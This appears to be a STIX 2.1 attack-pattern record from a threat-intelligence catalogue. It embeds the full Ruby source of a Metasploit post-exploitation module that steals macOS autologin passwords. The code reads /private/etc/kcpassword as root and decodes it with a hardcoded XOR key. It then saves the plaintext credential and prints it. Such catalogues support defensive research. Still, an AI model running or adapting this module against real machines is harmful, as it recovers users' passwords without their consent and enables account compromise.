{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1c28216d-11af-449c-9ec3-1b857adab7f7",
    "created": "2024-08-14T16:33:00.699697Z",
    "modified": "2024-08-14T16:33:00.699701Z",
    "name": "OSX Gather Autologin Password as Root",
    "description": " This module will steal the plaintext password of any user on the machine with autologin enabled. Root access is required.  When a user has autologin enabled (System Preferences -> Accounts), OSX stores their password with an XOR encoding in /private/etc/kcpassword.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/osx/gather/autologin_password.rb",
            "external_id": "autologin_password.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.brock-family.org/gavin/perl/kcpassword.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::OSX::Priv\n\n  # extract/verify by by XORing your kcpassword with your password\n  AUTOLOGIN_XOR_KEY = [0x7D, 0x89, 0x52, 0x23, 0xD2, 0xBC, 0xDD, 0xEA, 0xA3, 0xB9, 0x1F]\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OSX Gather Autologin Password as Root',\n        'Description' => %q{\n          This module will steal the plaintext password of any user on the machine\n          with autologin enabled. Root access is required.\n\n          When a user has autologin enabled (System Preferences -> Accounts), OSX\n          stores their password with an XOR encoding in /private/etc/kcpassword.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'joev' ],\n        'Platform' => [ 'osx' ],\n        'References' => [\n          ['URL', 'http://www.brock-family.org/gavin/perl/kcpassword.html']\n        ],\n        'SessionTypes' => [ 'meterpreter', 'shell' ]\n      )\n    )\n\n    register_advanced_options([\n      OptString.new('KCPASSWORD_PATH', [true, 'Path to kcpassword file', '/private/etc/kcpassword'])\n    ])\n  end\n\n  def run\n    # ensure the user is root (or can read the kcpassword)\n    unless is_root?\n      fail_with(Failure::NoAccess, 'Root privileges are required to read kcpassword file')\n    end\n\n    # read the autologin account from prefs plist\n    read_cmd = 'defaults read /Library/Preferences/com.apple.loginwindow autoLoginUser username'\n    autouser = cmd_exec(\"/bin/sh -c '#{read_cmd} 2> /dev/null'\")\n\n    if autouser.present?\n      print_status \"User #{autouser} has autologin enabled, decoding password...\"\n    else\n      fail_with(Failure::NotVulnerable, 'No users on this machine have autologin enabled')\n    end\n\n    # kcpass contains the XOR'd bytes\n    kcpass = read_file(kcpassword_path)\n    key = AUTOLOGIN_XOR_KEY\n\n    # decoding routine, slices into 11 byte chunks and XOR's each chunk\n    decoded = kcpass.bytes.to_a.each_slice(key.length).map do |kc|\n      kc.each_with_index.map { |byte, idx| byte ^ key[idx] }.map(&:chr).join\n    end.join.sub(/\\x00.*$/, '')\n\n    # save in the database\n    # Don't record a Login, since we don't know what service to tie it to\n    credential_data = {\n      workspace_id: myworkspace_id,\n      origin_type: :session,\n      session_id: session_db_id,\n      post_reference_name: refname,\n      username: autouser,\n      private_data: decoded,\n      private_type: :password\n    }\n\n    create_credential(credential_data)\n    print_good \"Decoded autologin password: #{autouser}:#{decoded}\"\n  end\n\n  private\n\n  def kcpassword_path\n    datastore['KCPASSWORD_PATH']\n  end\n\n  def user\n    @user ||= cmd_exec('whoami').chomp\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'osx' ]"
    ]
}